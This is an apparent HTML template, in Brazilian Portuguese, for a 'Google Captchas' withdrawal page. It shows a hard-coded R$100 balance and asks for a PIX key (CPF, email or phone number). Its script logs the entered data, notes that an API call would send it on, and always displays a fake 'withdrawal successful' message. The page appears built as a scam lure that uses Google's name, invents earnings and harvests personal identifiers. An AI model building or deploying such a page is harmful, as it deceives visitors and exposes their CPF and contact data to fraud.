<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Captchas - Saque</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            position: relative;
            border-radius: 8px;
        }
        picture img {
            width: 100%;
            height: auto;
        }
        .saldo {
            background-color: #4caf50;
            color: white;
            padding: 10px;
            text-align: center;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 1.5em;
        }
        .content {
            margin: 20px 0;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 15px;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn-green {
            background-color: #28a745;
            color: white;
        }
        .btn:hover {
            background-color: #218838;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input, .form-group select {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .success-message, .error-message {
            display: none;
            padding: 10px;
            margin-top: 10px;
            border-radius: 4px;
        }
        .success-message {
            background-color: #d4edda;
            color: #155724;
        }
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
        }
        @media (max-width: 600px) {
            .container {
                padding: 10px;
            }
            .saldo {
                font-size: 1.2em;
            }
            .btn {
                font-size: 1em;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="withdrawPage">
        <picture>
            <source srcset="assets/img/img1.webp" type="image/webp">
            <source srcset="assets/img/img1.png" type="image/png">
            <img src="assets/img/img1.png" alt="Google Captchas">
        </picture>
        <div class="saldo" id="withdrawSaldo">
            Saldo: R$100,00
        </div>
        <div class="content">
            <h1>Capturar Chave PIX</h1>
            <form id="pixForm" onsubmit="submitForm(event)">
                <div class="form-group">
                    <label for="pixType">Tipo de Chave PIX</label>
                    <select id="pixType" name="pixType" onchange="showPixField()" required>
                        <option value="">Selecione</option>
                        <option value="cpf">CPF</option>
                        <option value="email">Email</option>
                        <option value="phoneNumber">Celular</option>
                    </select>
                </div>
                <div class="form-group" id="cpfField" style="display:none;">
                    <label for="cpf">CPF</label>
                    <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" oninput="validateCPF()">
                    <div id="cpfError" class="error">O CPF deve ter 11 dígitos numéricos.</div>
                </div>
                <div class="form-group" id="emailField" style="display:none;">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" placeholder="Digite seu email" oninput="validateEmail()">
                    <div id="emailError" class="error">Por favor, digite um email válido.</div>
                </div>
                <div class="form-group" id="phoneField" style="display:none;">
                    <label for="phone">Celular</label>
                    <input type="text" id="phone" name="phone" placeholder="Digite seu celular" oninput="validatePhone()">
                    <div id="phoneError" class="error">O número deve ter 11 dígitos numéricos.</div>
                </div>
                <button type="submit" class="btn btn-green">Sacar Agora</button>
            </form>
            <div id="successMessage" class="success-message">Saque realizado com sucesso!</div>
            <div id="errorMessage" class="error-message"></div>
        </div>
    </div>

    <script>
        function showPixField() {
            const pixType = document.getElementById('pixType').value;
            document.getElementById('cpfField').style.display = 'none';
            document.getElementById('emailField').style.display = 'none';
            document.getElementById('phoneField').style.display = 'none';
            
            if (pixType === 'cpf') {
                document.getElementById('cpfField').style.display = 'block';
            } else if (pixType === 'email') {
                document.getElementById('emailField').style.display = 'block';
            } else if (pixType === 'phoneNumber') {
                document.getElementById('phoneField').style.display = 'block';
            }
        }

        function validatePhone() {
            const phone = document.getElementById('phone').value;
            const phoneRegex = /^[0-9]{11}$/;
            const phoneError = document.getElementById('phoneError');
            if (phoneRegex.test(phone)) {
                phoneError.style.display = 'none';
            } else {
                phoneError.style.display = 'block';
            }
        }

        function validateEmail() {
            const email = document.getElementById('email').value;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const emailError = document.getElementById('emailError');
            if (emailRegex.test(email)) {
                emailError.style.display = 'none';
            } else {
                emailError.style.display = 'block';
            }
        }

        function validateCPF() {
            const cpf = document.getElementById('cpf').value;
            const cpfRegex = /^[0-9]{11}$/;
            const cpfError = document.getElementById('cpfError');
            if (cpfRegex.test(cpf)) {
                cpfError.style.display = 'none';
            } else {
                cpfError.style.display = 'block';
            }
        }

        async function submitForm(event) {
            event.preventDefault();
            const pixType = document.getElementById('pixType').value;
            const cpf = document.getElementById('cpf').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;

            const data = {
                pixType: pixType,
                key: pixType === 'cpf' ? cpf : pixType === 'email' ? email : phone
            };

            // Exemplo de envio de dados, aqui você faria o envio via API
            console.log('Dados enviados:', data);

            document.getElementById('successMessage').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
        }
    </script>
</body>
</html>
